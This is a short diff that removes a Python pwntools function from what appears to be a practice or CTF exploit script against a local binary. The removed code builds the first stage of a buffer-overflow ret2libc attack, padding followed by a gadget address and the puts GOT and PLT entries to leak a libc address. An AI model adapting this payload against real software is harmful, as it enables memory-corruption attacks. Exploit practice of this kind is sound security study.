@@ -66,22 +66,3 @@ ret2libc()
 
 
 
-def ret2libc():
-	
-	p=process("./bof_1ver4")
-	raw_input("DEBUG")
-	elf=ELF("./bof_1ver4")
-	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-	#lan 1
-	payload="999"
-	p.sendline(payload)
-	
-	payload="a".ljust(40,'a')
-	payload+=p64(0x0000000000400bb3)
-	payload+=p64(elf.symbols['got.puts'])
-	payload+=p64(elf.symbols['plt.puts'])
-	payload+=p64(elf.symbols['main'])
-
-	p.interactive()
-# ret2libc()
